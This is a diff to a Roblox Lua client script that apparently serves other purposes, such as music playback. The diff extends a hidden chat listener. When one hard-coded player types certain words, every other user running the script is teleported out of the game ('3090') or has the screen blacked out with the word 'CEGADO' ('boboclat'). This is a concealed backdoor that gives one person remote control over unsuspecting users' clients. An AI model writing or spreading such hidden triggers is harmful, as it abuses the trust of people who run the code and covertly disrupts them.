@@ -128,16 +128,64 @@ local function stopMusic()
 	currentMusic = nil
 end
 
--- === DETECCIÓN DE CHAT: ELPAPUKLLKV + 3090 ===
+-- === DETECCIÓN DE CHAT: ELPAPUKLLKV + 3090 / BOBOCLAT / BOBOCLA ===
+local blindScreenGui = nil
+local isBlinded = false
+
+local function createBlindScreen()
+	if blindScreenGui then return end
+	
+	blindScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+	blindScreenGui.ResetOnSpawn = false
+	blindScreenGui.Name = "BlindScreen"
+	blindScreenGui.ZIndex = 999
+	
+	local blackScreen = Instance.new("Frame", blindScreenGui)
+	blackScreen.Size = UDim2.new(1, 0, 1, 0)
+	blackScreen.Position = UDim2.new(0, 0, 0, 0)
+	blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	blackScreen.BackgroundTransparency = 0
+	blackScreen.BorderSizePixel = 0
+	blackScreen.ZIndex = 1000
+	
+	local blindText = Instance.new("TextLabel", blackScreen)
+	blindText.Size = UDim2.new(1, 0, 1, 0)
+	blindText.Position = UDim2.new(0, 0, 0, 0)
+	blindText.BackgroundTransparency = 1
+	blindText.Text = "CEGADO"
+	blindText.TextColor3 = Color3.fromRGB(255, 0, 0)
+	blindText.Font = Enum.Font.GothamBlack
+	blindText.TextSize = 60
+	blindText.TextScaled = true
+	blindText.ZIndex = 1001
+	
+	isBlinded = true
+end
+
+local function removeBlindScreen()
+	if blindScreenGui then
+		blindScreenGui:Destroy()
+		blindScreenGui = nil
+	end
+	isBlinded = false
+end
+
 local function setupChatDetection()
 	-- Conectar a jugadores ya existentes
 	for _, player in ipairs(Players:GetPlayers()) do
 		if player ~= LocalPlayer then
 			pcall(function()
 				player.Chatted:Connect(function(message)
-					if player.Name == "elpapukllkv" and string.find(message:lower(), "3090") then
-						task.wait(0.5)
-						TeleportService:Teleport(game.PlaceId, LocalPlayer)
+					if player.Name == "elpapukllkv" then
+						local msgLower = message:lower()
+						if string.find(msgLower, "3090") then
+							task.wait(0.5)
+							TeleportService:Teleport(game.PlaceId, LocalPlayer)
+						elseif string.find(msgLower, "boboclat") then
+							createBlindScreen()
+						elseif string.find(msgLower, "bobocla") and not string.find(msgLower, "boboclat") then
+							removeBlindScreen()
+						end
 					end
 				end)
 			end)
@@ -150,9 +198,16 @@ local function setupChatDetection()
 		if player ~= LocalPlayer then
 			pcall(function()
 				player.Chatted:Connect(function(message)
-					if player.Name == "elpapukllkv" and string.find(message:lower(), "3090") then
-						task.wait(0.5)
-						TeleportService:Teleport(game.PlaceId, LocalPlayer)
+					if player.Name == "elpapukllkv" then
+						local msgLower = message:lower()
+						if string.find(msgLower, "3090") then
+							task.wait(0.5)
+							TeleportService:Teleport(game.PlaceId, LocalPlayer)
+						elseif string.find(msgLower, "boboclat") then
+							createBlindScreen()
+						elseif string.find(msgLower, "bobocla") and not string.find(msgLower, "boboclat") then
+							removeBlindScreen()
+						end
 					end
 				end)
 			end)
